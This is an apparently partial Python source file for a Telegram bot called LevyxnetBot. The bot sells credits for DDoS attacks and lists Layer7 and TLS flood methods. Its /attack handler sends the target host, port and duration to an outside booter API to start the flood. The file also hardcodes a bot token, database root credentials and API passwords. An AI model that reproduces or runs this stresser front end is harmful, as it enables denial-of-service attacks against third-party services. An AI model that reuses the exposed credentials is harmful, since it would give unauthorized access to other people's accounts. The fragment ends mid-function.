...
token = "6368440402:AAH-yVNkOoyRpENBuY_qBUmviJRWcbnO8l0"
...
def balance(update: Update, context: CallbackContext):
    ...
    try:
        db = MySQLdb.connect("127.0.0.1:3306", "root", "root", "luffynft_secrid")
        insertrec = db.cursor()
...
def start(update: Update, context: CallbackContext):
          update.message.reply_text(f"🌩 | LevyxnetBot" + '\n' + '\n' + "📁 Main Commands" + '\n' + " ⤷  📔 ➧ /help" + '\n' + " ⤷  🗝 ➧ /redeem" + '\n' + " ⤷  🪙 ➧ /balance" + '\n' + " ⤷  💣 ➧ /attack" + '\n' + " ⤷  📝 ➧ /methods" + '\n' + '\n' + "🛒 Purchase credits @LEVYXNET")

def methods(update: Update, context: CallbackContext):
          update.message.reply_text(f"👁 LevyxnetBot Methods" + '\n' + '\n' + "📁 Layer7" + '\n' + " ⤷  TLSX" + '\n' + " ⤷  HTTPS-SPAM" + '\n' + " ⤷  BROWSER" + '\n' + " ⤷  HTTPS" + '\n' + " ⤷  HTTP" + '\n' + '\n' + "TLS" + '\n' + " ⤷  HTTP-ENTOD" + '\n' + '\n' + "Usage /attack [method] [host] [port] [time]")
...
def part4(update, context):
    ...
    try:
        ...
        methods = ["http-entod", "HTTP-ENTOD", "tls", "TLS", "http", "HTTP", "https", "HTTPS", "browser", "BROWSER", "https-spam", "HTTPS-SPAM", "tlsx", "TLSX"]
        if method in methods:
            if int(time) > 60:
                ...
                apireq = requests.get(f"https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host={host}&port={port}&time={time}&method=http")
                apireq = requests.get(f"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host={host}&port={port}&time={time}&method=http")
                update.message.reply_text("💣 <b>✅Attack has been Started!✅</b>" + '\n' + '\n' + f"⤷ Host: {host}" + '\n' + f"⤷ Port: {port}" + '\n' + f"⤷ Time: {time}" + '\n' + f"⤷ Method: {method}" + '\n' + '\n' + f"🪙 -1 Attack Credit.",parse_mode=ParseMode.HTML)
                return ConversationHandler.END
        else:
